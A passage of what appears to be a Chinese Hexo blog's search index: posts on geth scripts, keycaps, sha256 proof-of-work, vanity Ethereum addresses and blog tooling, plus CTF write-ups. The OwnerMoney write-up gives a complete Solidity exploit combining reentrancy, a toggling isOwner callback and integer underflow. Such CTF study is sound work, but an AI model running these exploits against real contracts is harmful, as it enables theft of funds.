  </entry>
  <entry>
    <title><![CDATA[nodejs ÁõëÂê¨ÁßÅÊúâÈìæpending‰∫§ÊòìÂπ∂Ëá™Âä®miner]]></title>
    <url>%2F2020%2Fauto-pending-miner%2F</url>
    <content type="text"><![CDATA[ÂâçË®Änodejs ÁõëÂê¨ÁßÅÊúâÈìæ pending ‰∫§ÊòìÂπ∂Ëá™Âä® miner 123456789101112131415161718192021222324252627const Web3 = require('web3')var web3 = new Web3()//web3 = new Web3(new Web3.providers.IpcProvider('', ipcProviderWrapper))const web3Admin = require('./web3admin.js')web3.setProvider(new web3.providers.HttpProvider('http://localhost:8548'))web3Admin.extend(web3)function sleep(millis) &#123; return new Promise(function (resolve, reject) &#123; setTimeout(function () &#123; resolve(); &#125;, millis); &#125;);&#125;async function main()&#123; while(1)&#123; if(web3.txpool.status['pending']==1)&#123; console.log("turning off mining", web3.miner.start()); console.log("isMining?", web3.eth.mining); &#125;else&#123; console.log("turning off mining", web3.miner.stop()); console.log("isMining?", web3.eth.mining); await sleep(10000); &#125; &#125;&#125;main()]]></content>
      <categories>
        <category>Scripts</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
        <tag>geth</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[geth --rpcaddr]]></title>
    <url>%2F2020%2Fprivate%2F</url>
    <content type="text"><![CDATA[ÂâçË®Ä ÊúÄËøëÂú®ÂÜÖÁΩëÁéØÂ¢É‰∏ãÂá∫Âå∫ÂùóÈìæÁöÑÈ¢òÁõÆÔºåÂõ†‰∏∫ÊòØÂÜÖÁΩëÔºåÊâÄ‰ª•ËÄÉËôëËá™Â∑±Êê≠Âª∫ÁßÅÈìæÔºåÂõ†‰∏∫ËÄÉËôëÂÜÖÁΩëÁéØÂ¢É flag ÁöÑÂèëÈÄÅÈóÆÈ¢òÔºåÊâÄ‰ª•‰ΩøÁî® web3.py + django + nginx ÁöÑÂΩ¢Âºè ËÆ∞ÂΩï‰∏Ä‰∏ã‰ΩøÁî® geth Êê≠Âª∫ÁßÅÈìæÁöÑÂùë Èöè‰æøÂÜô‰∏ÄÂÜôÔºåÊÉ≥Âà∞Âì™ÂÜôÂà∞Âì™ ÂêØÂä®ÁßÅÊúâÈìæÁöÑÊó∂ÂÄôË¶ÅÊ≥®ÊÑè --rpcaddr ÈÄâÈ°π rpcaddr ÈªòËÆ§ÊòØ localhost ÔºåÂ¶ÇÊûúÊ≤°ÊúâÊòéÁ°ÆÊåáÂÆö ip ,ÈÇ£‰πà geth attach ÈÄöËøá TCP ËøûÊé•Âè™ËÉΩÊòØ geth attach http://localhost:port Â¶ÇÊûú rpcaddr ÊòéÁ°ÆÊåáÂÆö‰∫Ü ip ÔºåÈÇ£‰πàÂç≥‰ΩøÂú®Êú¨Âú∞‰∏ªÊú∫Ôºå‰πüÊó†Ê≥ïÈÄöËøá Web3.HTTPProvider(&#39;http://localhost:8545&#39;) ËøûÊé•ÔºåË¢´Ëøô‰∏™Âùë‰∫Ü‰∏§‰∏™Â§öÂ∞èÊó∂Ôºå‰∏ÄÂºÄÂßã‰∏ÄÁõ¥ÊòØ requests.exceptions.ConnectionError ÁöÑÈîôËØØÔºåÂ§¥ÁöÆÂèëÈ∫ªÔºåÂêéÊù•Èùô‰∏ãÂøÉÊù•‰ªîÁªÜÊÉ≥‰∫Ü‰∏Ä‰∏ãÔºåÊâçÊÉ≥Âà∞ÊòØËøô‰∏™ÂéüÂõ†ÔºåÂÅö‰∏™Á¨îËÆ∞Èïø‰∏™ËÆ∞ÊÄß]]></content>
      <categories>
        <category>tools</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
        <tag>geth</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Êú∫Ê¢∞ÈîÆÁõò-ÈîÆÂ∏Ω]]></title>
    <url>%2F2020%2Fkeyboard%2F</url>
    <content type="text"><![CDATA[ÂâçË®Ä ËÆ∞ÂΩïÊØè‰∏™Èò∂ÊÆµÊÉ≥Ë¶ÅËÆ∞ÂΩïÁöÑ‰∏úË•ø ÂÖ•‰∫ÜÊú∫Ê¢∞ÈîÆÁõòÁöÑÂùë‚Ä¶‚Ä¶ Â•ΩÁúãÁöÑÈîÆÂ∏Ω ÈöèÊÑèÂÜô‰∏ÄÂÜô‚Ä¶‚Ä¶ ÈîÆÂ∏Ω ÈîÆÂ∏ΩÈ´òÂ∫¶ Â∏∏ËßÅÈîÆÂ∏ΩÈ´òÂ∫¶Êåâ‰ªéÈ´òÂà∞‰ΩéÊéíÂàó‰∏∫ÔºöOEM(‰ª£Â∑•ÂéÇ) - SP - Cherry(ÂéüÂéÇ) ÁêÉÂ∏ΩÂàÜ‰∏∫ SA - DSA ÔºåDSA È´òÂ∫¶‰ªé‰æßÈù¢ÁúãÊ≤°ÊúâÊòéÊòæÁöÑ‰∫∫‰ΩìÂ∑•Á®ãÂ≠¶Êõ≤Á∫øÔºå SA ÂàôÊúâÁ¨¶Âêà‰∫∫‰ΩìÂ∑•Á®ãÂ≠¶ÁöÑÊõ≤Á∫ø„ÄÇ ÈîÆÂ∏ΩÊùêË¥®Ôºö‰∏ªË¶ÅÂàÜ‰∏∫ ABS „ÄÅPBT „ÄÅPOM ‰∏âÁßç ‰ΩøÁî®ËæÉÂ§öÁöÑÊòØ ABS Âíå PBT ÂÖ∑‰ΩìÁªÜËäÇÂéüÁêÜÊàëÂ∞±Ê≤°ÊúâÂéª‰∫ÜËß£ÔºåÂè™Áü•ÈÅìÊâãÊÑüÂ•ΩÔºå‰ΩÜÂÆπÊòìÊâìÊ≤πÔºåÊúÄÂ•ΩËøòÊòØÈÄâÁî® PBT ÁÉ≠ÂçáÂçéÊàñËÄÖ‰∫åËâ≤ÊàêÂûã Â•ΩÁúãÁöÑÈîÆÂ∏Ω Âè™ÊòØ‰∏™‰∫∫ËÆ§‰∏∫Â•ΩÁúãÁöÑÔºåÂãøÂñ∑233333 Â•∂Áì∂ÊüØÂü∫ÊòØ 2020-03-22 Êôö‰∏ä 20:00 ÂºÄÂîÆÔºåÈôêÈáè 130 Â•ó ÊéíÈ™®ÁîµËÄóÂ≠ê ÊéíÈ™®Êü¥Áä¨ Â•∂Áì∂ÊüØÂü∫ÈªÑ Â•∂Áì∂ÊüØÂü∫Á≤â Â•∂Áì∂ÈæôÁå´ Â•∂Áì∂ÈæôÁå´ Â•∂Áì∂ÁîµÁé©]]></content>
      <categories>
        <category>Keyboard</category>
      </categories>
      <tags>
        <tag>Keyboadrd</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sha256(py2 vs py3)]]></title>
    <url>%2F2020%2Fsha256%2F</url>
    <content type="text"><![CDATA[ÂâçË®Äsha256 Â∑•‰ΩúÈáèËØÅÊòéÔºåpython2 Âíå python3 ÁöÑ‰∏çÂêå python2123456789101112131415def sha256_pj(prefix): chars = ''.join(chr(i) for i in range(32,127)[::-1]) for password_length in range(4,5): for iteration in itertools.product(chars, repeat=password_length): iteration = ''.join(iteration) h = hashlib.sha256() h.update(prefix.encode() + iteration) bits = ''.join(bin(int(i, 16))[2:].zfill(4) for i in h.hexdigest()) print iteration, bits[:18] if bits[:18] == "0"*18: print "The password is: " + iteration return iteration python31234567891011121314151617import hashlib,itertoolsdef sha256_pj(prefix): chars = ''.join(chr(i) for i in range(32,127)[::-1]) for password_length in range(4,5): for iteration in itertools.product(chars, repeat=password_length): iteration = ''.join(iteration) h = hashlib.sha256() h.update((prefix + iteration).encode()) bits = ''.join(bin(i)[2:].zfill(8) for i in h.digest()) print(iteration, bits[:18]) if bits[:18] == "0"*18: print("The password is: " + iteration) return iteration]]></content>
      <categories>
        <category>Scripts</category>
      </categories>
      <tags>
        <tag>Scripts</tag>
        <tag>Python2</tag>
        <tag>Python3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[OwnerMoney]]></title>
    <url>%2F2020%2FOwnerMoney%2F</url>
    <content type="text"><![CDATA[ÂâçË®Ä È´òÊ†°Êàò‚ÄúÁñ´‚ÄùÁΩëÁªúÂÆâÂÖ®ÂàÜ‰∫´ËµõÂå∫ÂùóÈìæ OwnerMoney È¢òÁõÆ ‰ª•Â§™Âùä Ropsten ÊµãËØïÈìæ ÂêàÁ∫¶Âú∞ÂùÄÔºöhttps://ropsten.etherscan.io/address/0x40a590b70790930ceed4d148bf365eea9e8b35f4 È¢òÁõÆÔºöhttps://github.com/hitcxy/challenges/tree/master/2020/OwnerMoney Source123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115pragma solidity ^0.4.23;interface Changing &#123; function isOwner(address) view public returns (bool);&#125;contract OwnerMoney &#123; address private owner; address private backup; mapping(address =&gt; uint) public balanceOf; mapping(address =&gt; bool) public status; mapping(address =&gt; uint) public buyTimes; constructor() &#123; owner = msg.sender; backup = msg.sender; &#125; event pikapika_SendFlag(string b64email); modifier onlyOwner()&#123; require(msg.sender == owner); _; &#125; function payforflag(string b64email) onlyOwner public &#123; require(buyTimes[msg.sender] &gt;= 100); _init(); buyTimes[msg.sender] = 0; address(0x4cfbdFE01DAEF460B925773754821E7461750923).transfer(address(this).balance); emit pikapika_SendFlag(b64email); &#125; function _init() internal &#123; owner = backup; &#125; function change(address _owner) public &#123; Changing tmp = Changing(msg.sender); if(!tmp.isOwner(_owner))&#123; status[msg.sender] = tmp.isOwner(_owner); &#125; &#125; function change_Owner() &#123; require(tx.origin != msg.sender); require(uint(msg.sender) &amp; 0xfff == 0xfff); if(status[msg.sender] == true)&#123; status[msg.sender] = false; owner = msg.sender; &#125; &#125; function _transfer(address _from, address _to, uint _value) internal &#123; require(_to != address(0x0)); require(_value &gt; 0); uint256 oldFromBalance = balanceOf[_from]; uint256 oldToBalance = balanceOf[_to]; uint256 newFromBalance = balanceOf[_from] - _value; uint256 newToBalance = balanceOf[_to] + _value; require(oldFromBalance &gt;= _value); require(newToBalance &gt; oldToBalance); balanceOf[_from] = newFromBalance; balanceOf[_to] = newToBalance; assert((oldFromBalance + oldToBalance) == (newFromBalance + newToBalance)); &#125; function transfer(address _to, uint256 _value) public returns (bool success) &#123; _transfer(msg.sender, _to, _value); return true; &#125; function buy() payable public returns (bool success)&#123; require(tx.origin != msg.sender); require(uint(msg.sender) &amp; 0xfff == 0xfff); require(buyTimes[msg.sender]==0); require(balanceOf[msg.sender]==0); require(msg.value == 1 wei); balanceOf[msg.sender] = 100; buyTimes[msg.sender] = 1; return true; &#125; function sell(uint256 _amount) public returns (bool success)&#123; require(_amount &gt;= 200); require(buyTimes[msg.sender] &gt; 0); require(balanceOf[msg.sender] &gt;= _amount); require(address(this).balance &gt;= _amount); msg.sender.call.value(_amount)(); _transfer(msg.sender, address(this), _amount); buyTimes[msg.sender] -= 1; return true; &#125; function balance0f(address _address) public view returns (uint256 balance) &#123; return balanceOf[_address]; &#125; function eth_balance() public view returns (uint256 ethBalance)&#123; return address(this).balance; &#125; &#125; Analyse Êü•Áúã payforflag ÔºåÊàë‰ª¨ÈúÄË¶ÅÊàê‰∏∫ owner ÔºåÂêåÊó∂ buyTimes[msg.sender] &gt;= 100 ÊÉ≥Ë¶ÅÊàê‰∏∫ owner ÔºåÂèØ‰ª•ÈÄöËøá change_owner ÂáΩÊï∞ÂÆûÁé∞ change_owner ÂáΩÊï∞Ë¶ÅÊ±ÇÂøÖÈ°ªÈÄöËøáÂêàÁ∫¶Ë∞ÉÁî®ÔºåËÄå‰∏çÊòØÂ§ñÈÉ®Ë¥¶Êà∑Ë∞ÉÁî®ÔºåÂêåÊó∂Ë¶ÅÊ±ÇÂêàÁ∫¶Âú∞ÂùÄÊúÄÂêé‰∏â‰ΩçÊòØ 0xfff ÔºåÂèØ‰ª•ÂèÇËÄÉ https://hitcxy.com/2020/generate-address/ status[msg.sender] Ë¶ÅÊ±Ç‰∏∫ true ÔºöÂèØ‰ª•ÈÄöËøá change(address _owner) Ëß£ÂÜ≥ÔºåChanging Êé•Âè£‰∏≠Â£∞Êòé‰∫Ü isOwner ÂáΩÊï∞ÔºåÁî®Êà∑ÂèØËá™Ë°åÁºñÂÜôÔºåË¶Å‰Ωø status[msg.sender] = true ÔºåÂàô tmp.isOwner(_owner) Á¨¨‰∏ÄÊ¨°Ë∞ÉÁî®ÈúÄËøîÂõû false ÔºåÁ¨¨‰∫åÊ¨°Ë∞ÉÁî®ËøîÂõû true ÔºåÊâÄ‰ª•Â∞±Êúâ‰∫ÜÊÄùË∑ØÔºöËÆæÁΩÆ‰∏Ä‰∏™ÂàùÂßãÂÄº‰∏∫ true ÁöÑÂèòÈáèÔºåÊØèÊ¨°Ë∞ÉÁî® isOwner()Êó∂ÔºåÂ∞ÜÂÖ∂ÂèñÂèçÂÜçËøîÂõû„ÄÇËøôÊ†∑‰æøÊª°Ë∂≥‰∫ÜÊàë‰ª¨ÊòØ owner ÔºåÂè™ÈúÄÂÜçÊª°Ë∂≥ buyTimes[msg.sender] &gt;= 100 ÂèëÁé∞Âè™Êúâ sell ÂáΩÊï∞Ôºå‰ºöÊúâ buyTimes[msg.sender] -= 1 ÁöÑÊìç‰ΩúÔºåÂÖ∂ÂÆûËøôÊòØÈáçÂÖ•ÈóÆÈ¢òÔºåËøôÈáåÈúÄË¶ÅÊª°Ë∂≥ require(_amount &gt;= 200) Ôºå‰ΩÜÊòØ buy Âè™ËÉΩÁªô 100 ÔºåÂÖ∏ÂûãÁöÑËñÖÁæäÊØõÈóÆÈ¢òÔºåÊúÄÂêéÂÜçÂà©Áî®Êï¥Êï∞‰∏ãÊ∫¢Âç≥ÂèØÊª°Ë∂≥ buyTimes[msg.sender] &gt;= 100 exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152pragma solidity ^0.4.23;contract attack1 &#123; address instance_address = 0xb9f9a887b06b54ab851928f3bc721b120876196b ; OwnerMoney target = OwnerMoney(instance_address); bool public flag = true; uint public have_sell = 0; constructor() payable &#123;&#125; function isOwner(address) public returns (bool)&#123; flag = !flag; return flag; &#125; function hack1() &#123; target.change(address(this)); target.change_Owner(); target.buy.value(1)(); &#125; function hack2() &#123; target.sell(200); &#125; function hack3(string b64email) &#123; target.payforflag(b64email); &#125; function() payable &#123; if (have_sell &lt; 1) &#123; have_sell += 1; target.sell(200); &#125; &#125;&#125;contract attack2 &#123; address instance_address = 0xb9f9a887b06b54ab851928f3bc721b120876196b; OwnerMoney target = OwnerMoney(instance_address); constructor() payable &#123;&#125; function hack1() &#123; target.buy.value(1)(); target.transfer(0xde76c7f9fff36f128d153ee068ccd5a0e7b9afff,100); &#125;&#125;]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
        <tag>xctf È´òÊ†°Á´ô‚ÄúÁñ´‚Äù</tag>
        <tag>OwnerMoney</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Neat Download Manager Mac]]></title>
    <url>%2F2020%2FNeatDownloadManagerMac%2F</url>
    <content type="text"><![CDATA[ÂâçË®Ä ÈúÄË¶Å‰ªéÁôæÂ∫¶‰∫ë‰∏ãËΩΩ‰∏Ä‰∫õ‰∏úË•øÔºå‰ΩÜËø´‰∫éÂ§™Á©∑ÔºåÁôæÂ∫¶‰∫ë SVIP ‰∏çÁ¨¶ÂêàÊàëÁöÑË∫´‰ªΩÔºåÂ∞±ÊêúÈõÜ‰∫Ü‰∏Ä‰∫õÁôæÂ∫¶‰∫ëÊèêÈÄü‰∏ãËΩΩÁöÑÊñπÊ≥ï ‰πãÂâç windows ÊòØÁî® Tampermonkey + IDM mac Ê≤°Êúâ IDM ÔºåÂ∞ùËØïËøá folx pro ,Êó†Â•àÊ≤°Ê≥ï‰∏ãËΩΩÁôæÂ∫¶‰∫ëÊñá‰ª∂ ÊúÄÂêéÊâæÂà∞‰∫Ü Neat Download Manager ÔºåÊïàÊûúÂ¶Ç‰∏äÂõæÊâÄÁ§∫Ôºà‰∏ãËΩΩÈÄüÂ∫¶ÂíåÁΩëÁªúÂ∏¶ÂÆΩ‰πüÊúâÂÖ≥Á≥ªÔºâÔºåËá≥Â∞ë‰∏çÊòØÁôæÂ∫¶‰∫ëÁöÑÂá†ÂçÅKÊàñËÄÖ‰∏ÄÁôæÂ§öK‰∫Ü ÂÆâË£ÖÊñπÊ≥ï ÂÆâË£ÖÊ≤πÁå¥ Tampermonkey ÂÆâË£ÖÁΩëÁõòÂä©Êâã ÁΩëÁõòÂä©Êâã ÂÆâË£Ö Neat Download Manager Mac ,ÈìæÊé•: https://pan.baidu.com/s/1787cmz7Y60qX1-y32kZtRA ÊèêÂèñÁ†Å: pika ‰ΩøÁî®ÊñπÊ≥ïÁõÆÂâçÂè™ËÉΩÂú®ÁôæÂ∫¶ÁΩëÁõòÁöÑ„ÄåÁÆ°ÁêÜÈ°µÈù¢„Äç‰∏ä‰ΩøÁî®Ôºå‰πüÂ∞±ÊòØËøôÈáåÔºöhttps://pan.baidu.com/disk/home ‰ΩøÁî®ÊµèËßàÂô®ÔºåÁôªÂΩïËá™Â∑±ÁöÑÁôæÂ∫¶ÁΩëÁõòÂ∏êÂè∑„ÄÇÂ¶ÇÊûúÊòØÂà´‰∫∫ÂàÜ‰∫´ÁöÑËµÑÊ∫êÔºåÂèØ‰ª•ÂÖàÂ≠òÂà∞Ëá™Â∑±ÁöÑÁΩëÁõò‰∏ä ÈÄâÊã©Ë¶Å‰∏ãËΩΩÁöÑÊñá‰ª∂ÔºåÁÇπÂáªÈ°µÈù¢ÈáåÁöÑ ÁîüÊàêÈìæÊé• Êù•Ëé∑ÂèñÂä†ÈÄü‰∏ãËΩΩÂú∞ÂùÄ Âè≥ÈîÆÈÄâÊã© Download By NeatDownloadManager ÔºåÁÑ∂ÂêéÁ°ÆÂÆö‰∏ãËΩΩ]]></content>
      <categories>
        <category>tools</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>baiduyun</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ethereumÁîüÊàêÁâπÂÆöÂêéÁºÄË¥¶Âè∑ÁöÑËÑöÊú¨]]></title>
    <url>%2F2020%2Fgenerate-address%2F</url>
    <content type="text"><![CDATA[ÂâçË®Äethereum ÁîüÊàêÁâπÂÆöÂêéÁºÄË¥¶Êà∑ÁöÑËÑöÊú¨ÔºåÂåÖÊã¨ Â§ñÈÉ®Ë¥¶Êà∑ Âíå ÂêàÁ∫¶Ë¥¶Êà∑ 1234567891011121314151617181920212223242526272829303132333435from ethereum import utilsimport os, sys# generate EOA with appendix 1b1bdef generate_eoa1(): priv = utils.sha3(os.urandom(4096)) addr = utils.checksum_encode(utils.privtoaddr(priv)) while not addr.lower().endswith("1b1b"): priv = utils.sha3(os.urandom(4096)) addr = utils.checksum_encode(utils.privtoaddr(priv)) print('Address: &#123;&#125;\nPrivate Key: &#123;&#125;'.format(addr, priv.hex()))# generate EOA with the ability to deploy contract with appendix 1b1bdef generate_eoa2(): priv = utils.sha3(os.urandom(4096)) addr = utils.checksum_encode(utils.privtoaddr(priv)) while not utils.decode_addr(utils.mk_contract_address(addr, 0)).endswith("1b1b"): priv = utils.sha3(os.urandom(4096)) addr = utils.checksum_encode(utils.privtoaddr(priv)) print('Address: &#123;&#125;\nPrivate Key: &#123;&#125;'.format(addr, priv.hex()))if __name__ == "__main__": if sys.argv[1] == "1": generate_eoa1() elif sys.argv[1] == "2": generate_eoa2() else: print("Please enter valid argument") generate_eoa1 ÂèØ‰ª•Áõ¥Êé•ÁîüÊàê‰ΩéÂõõ‰Ωç‰∏∫ 1b1b ÁöÑÂ§ñÈÉ®Ë¥¶Êà∑ generate_eoa2 ÂèØ‰ª•ÁîüÊàê‰∏Ä‰∏™Â§ñÈÉ®Ë¥¶Êà∑ÔºåËØ•Â§ñÈÉ®Ë¥¶Êà∑ÈÉ®ÁΩ≤ÁöÑÁ¨¨‰∏Ä‰∏™Êô∫ËÉΩÂêàÁ∫¶ÁöÑÂú∞ÂùÄ‰ΩéÂõõ‰Ωç‰∏∫ 1b1b]]></content>
      <categories>
        <category>Scripts</category>
      </categories>
      <tags>
        <tag>Scripts</tag>
        <tag>ethereum</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[gitalk]]></title>
    <url>%2F2020%2Fgitalk%2F</url>
    <content type="text"><![CDATA[ÂâçË®ÄÂçöÂÆ¢Â¢ûÂä†ËØÑËÆ∫ÂäüËÉΩÂï¶ÔºÅÔºÅÔºÅÔºÅ ÂèÇËÄÉhttps://www.jianshu.com/p/b5f509f25872 Pursue your passion, and everything else will fall into place. This is not being romantic. This is the highest order of pragmatism. ‚Äî‚Äî Âä†Â∏ÉÈáåÂüÉÁàæ¬∑ÂêâÁ¶èËå≤ Èöè‰æøËÆ∞ÂΩï‰∏Ä‰∏ãÔºåÊ≤°Êúâ‰ªÄ‰πàÈÄªËæëÊÄß‚Üì ‰πãÂâçÂçöÂÆ¢ÊòØÈÉ®ÁΩ≤Âú® github + coding ‰∏äÔºåÂêéÊù•‰∏çÁü•ÈÅìÂá∫‰∫Ü‰ªÄ‰πàÈóÆÈ¢òÔºåÂè™ÊúâÊåÇÂÖ®Â±Ä‰ª£ÁêÜÊâçËÉΩËÆøÈóÆÔºåÂêéÂ∞±ÊääÂçöÂÆ¢ËøÅÁßªÂà∞‰∫Ü VPS ‰∏ä‚Üì ËØÑËÆ∫ÂäüËÉΩÂÖ∂ÂÆû‰∏ÄÁõ¥ÊÉ≥Âä†‰∏äÂéªÔºåÁî±‰∫éÊ≤°ÊúâÊâæÂà∞ÂêàÈÄÇÂèàÂ•ΩÁúãÁöÑÔºåÂ∞±‰∏ÄÁõ¥Ê≤°ÊúâÂä†‚Üì ÊúÄÂàùÂ∞ùËØïÁöÑÊòØ disqus ÔºåÊå∫ÁæéËßÇÔºå‰ΩÜÊó†Â•àÁî±‰∫éÂä†ËΩΩÈÄüÂ∫¶ÈóÆÈ¢òËøòÊòØÊîæÂºÉ‰∫Ü‚Üì ÂÅ∂ÁÑ∂ÂèëÁé∞ gitalk Ëøô‰∏™Á•ûÂ•áÁöÑËØÑËÆ∫Á≥ªÁªüÔºåÂ∞±Â∞ùËØï‰∫Ü‰∏Ä‰∏ãÔºåËøòÊå∫È°∫Âà©Ôºå‰∏ÄÊ¨°Â∞±ËÆæÁΩÆÊàêÂäüÔºåÊïàÊûúÂõæ‰πüÊå∫Â•ΩÁúã‚Üì ÂçöÂÆ¢Áªà‰∫éÊúâËØÑËÆ∫Á≥ªÁªüÂï¶„ÄåÂï¶Âï¶Âï¶„ÄçÔºå‰πüÂèØ‰ª•ÁïôË®ÄÂì¶ ÊôìÊúàËÄÅÊùøÁöÑËøôÈ¶ñÊ≠å‰πüÂ•ΩÂê¨Âì¶ÔºåÂìàÂìàÂìàÂìàÂìà]]></content>
      <categories>
        <category>tools</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>gitalk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[D^3CTF 2019 bet2loss_v2]]></title>
    <url>%2F2019%2Fbet2loss-v2%2F</url>
    <content type="text"><![CDATA[ÂâçË®ÄÂà©Áî®ÂàöËøáÂéªÁöÑÂë®Êú´ÂèÇÂä†‰∫Ü D^3CTF ÔºåÂÅö‰∫Ü‰∏ÄÈÅìÂå∫ÂùóÈìæÁöÑÈ¢òÁõÆÔºåÂú®Ê≠§ËÆ∞ÂΩï‰∏Ä‰∏ãÔºö ‰ª•Â§™Âùä Kovan ÊµãËØïÈìæ ÂêàÁ∫¶Âú∞ÂùÄÂä®ÊÄÅÁîüÊàêÔºåÊØè‰∏™Èòü‰ºçÂêàÁ∫¶Âú∞ÂùÄÂàÜÂºÄÔºà‰ΩÜÊòØÂàÜÂèëÂêàÁ∫¶Âú∞ÂùÄÁöÑË¥¶Êà∑ÊòØÂêå‰∏Ä‰∏™Ë¥¶Êà∑ÔºåÊâÄ‰ª•ËØ¥ËøòÊòØÂèØ‰ª•Êü•Âà∞ÂÖ∂‰ªñ‰∫∫Âú®Èìæ‰∏äÁöÑ‰∫§Êòì2333Ôºâ hash-reveal-commit ÈöèÊú∫Êï∞ Âá∫È¢ò‰∫∫ÈááÁî®ÁöÑÊòØÂâçÂêéÂè∞‰∫§‰∫íÁöÑÊñπÊ≥ïÔºåÊâÄ‰ª•È¢òÁõÆÊ≤°ÊúâÂ§çÁé∞ÔºåËÆ∞ÂΩï‰∏ãËß£È¢òÁöÑÊÄùÊÉ≥ È¢òÁõÆË¶ÅÊ±ÇÂú®‰∏äÈù¢ÂõæÈáåÔºåÂÆòÊñπexpÂÖ•Âè£ È¢òÁõÆ exp Ôºöhttps://github.com/hitcxy/challenges/tree/master/2019/bet2loss_v2 ÂêàÁ∫¶‰ª£Á†Å‰∏ªË¶ÅÂáΩÊï∞‰∏∫ placeBet Âíå settleBet Ôºå placeBet Âª∫Á´ãËµåÂçöÔºåsettleBet ÂºÄÂ•ñ Âá∫È¢ò‰∫∫Âà©Áî®‰∫Ü hash-reveal-commit ÈöèÊú∫Êï∞ÁöÑÊÄùÊÉ≥ÔºåÈöèÊú∫Êï∞ÁöÑÂÆûÁé∞ÊîæÂú®‰∫ÜÊúçÂä°Á´Ø Áî®Êà∑È¶ñÂÖàÂú®ÂâçÂè∞ÈÄâÂ•Ω‰∏ãÊ≥®ÁöÑÊñπÂºè ‰πãÂêéÊúçÂä°Á´ØÁîüÊàêÈöèÊú∫Êï∞ reveal „ÄÅcommit„ÄÅcommitLastBlock ÂèäÂØπ commit Âíå commitLastBlock ÂìàÂ∏åÂêéÁöÑÁ≠æÂêç signatureÔºåsignature ‰∏≠ÂåÖÂê´ r„ÄÅs„ÄÅvÔºåÂπ∂ËøîÂõû commit„ÄÅcommitLastBlock„ÄÅr„ÄÅs„ÄÅv ‰ø°ÊÅØ ÂõûÂà∞ÂâçÁ´ØÔºåweb3.js ÈÖçÂêàËøîÂõûÁöÑÊï∞ÊçÆÂêë meta ÂèëËµ∑‰∫§ÊòìÔºå‰∫§ÊòìÊàêÂäüË¢´ÊâìÂåÖ‰πãÂêéÂêëÂêéÂè∞ÂèëËµ∑ËØ∑Ê±Ç settleBet ÂêéÁ´ØÊî∂Âà∞ËØ∑Ê±ÇÂêéÂØπËØ• commit ÂÅöÂºÄÂ•ñ È¢òÁõÆË¶ÅÊ±ÇÊòØ balanceOf(you) &gt; 300000 Ôºà È¢òÁõÆÊèèËø∞Â§ö‰∫Ü‰∏Ä‰∏™0ÔºåÂèØ‰ª•ÁúãÂêàÁ∫¶ÈáåÈù¢Â∫îËØ•ÊòØ 300000 Ôºâ 12345function PayForFlag() external returns (bool success)&#123; balances[msg.sender] = balances[msg.sender].sub(300000); emit GetFlag("Get flag!"); return true;&#125; ÂÖàÊù•Áúã‰∏ãÂêàÁ∫¶ÈáåÁöÑ placeBet ‰ª£Á†Å 123456789101112131415161718192021222324252627282930function placeBet(uint8 betnumber, uint8 modulo, uint40 wager, uint40 commitLastBlock, uint commit, bytes32 r, bytes32 s, uint8 v) external &#123; require (msg.sender != croupier, "croupier cannot bet with himself."); require (isContract(msg.sender)==false, "Only bet with real people."); AirdropCheck(); Bet storage bet = bets[commit]; require (bet.player == address(0), "Bet should be in a 'clean' state."); require (balances[msg.sender] &gt;= wager, "no more balances"); require (modulo &gt; 1 &amp;&amp; modulo &lt;= MAX_MODULO, "modulo should be within range."); require (betnumber &gt;= 0 &amp;&amp; betnumber &lt; modulo, "betnumber should be within range."); require (wager &gt;= MIN_BET &amp;&amp; wager &lt;= MAX_BET, "wager should be within range."); require (block.number &lt;= commitLastBlock, "Commit has expired."); bytes32 signatureHash = keccak256(abi.encodePacked(commitLastBlock, commit)); require (croupier == ecrecover(signatureHash, v, r, s), "ECDSA signature is not valid."); lockedInBets = uint128(wager); balances[msg.sender] = balances[msg.sender].sub(uint256(wager)); emit Commit(commit); bet.wager = wager; bet.betnumber = betnumber; bet.modulo = modulo; bet.placeBlockNumber = uint40(block.number); bet.player = msg.sender;&#125; ËøôÈáåÊúâ‰∏Ä‰∏™Á≠æÂêçÈ™åËØÅ 12bytes32 signatureHash = keccak256(abi.encodePacked(commitLastBlock, commit));require (croupier == ecrecover(signatureHash, v, r, s), "ECDSA signature is not valid."); Ê†πÊçÆ‰∏äËø∞ÂêàÁ∫¶ÈáåÈù¢ÁöÑÁ≠æÂêçÈ™åËØÅÂØπÂ∫î‰øÆÊîπÊúçÂä°Á´ØÂêéÂè∞Á≠æÂêçÈ™åËØÅÊñπÂºèÔºåÂèÇËÄÉÈìæÊé•‰∏∫ HCTF2018_bet2loss 123456789101112131415161718192021222324252627def random_num(start=2**20, end=2**30): random = Random() return random.randint(start,end)def random(): result = &#123;'address': config['address'], 'gasPrice': 12000000000&#125; reveal = random_num() result['commit'] = "0x"+sha3.keccak_256(bytes.fromhex(binascii.hexlify(reveal.to_bytes(32, 'big')).decode('utf-8'))).hexdigest() result['commitLastBlock'] = w3.eth.blockNumber + 250 message = binascii.hexlify(result['commitLastBlock'].to_bytes(5,'big')).decode('utf-8')+result['commit'][2:] message_hash = '0x'+sha3.keccak_256(bytes.fromhex(message)).hexdigest() signhash = w3.eth.account.signHash(message_hash, private_key=private_key) result['signature'] = &#123;&#125; result['signature']['r'] = '0x' + binascii.hexlify((signhash['r']).to_bytes(32,'big')).decode('utf-8') result['signature']['s'] = '0x' + binascii.hexlify((signhash['s']).to_bytes(32,'big')).decode('utf-8') result['signature']['v'] = signhash['v'] for key,value in result.items(): print('&#123;key&#125;:&#123;value&#125;'.format(key = key, value = value)) return result,reveal,w3.eth.blockNumber 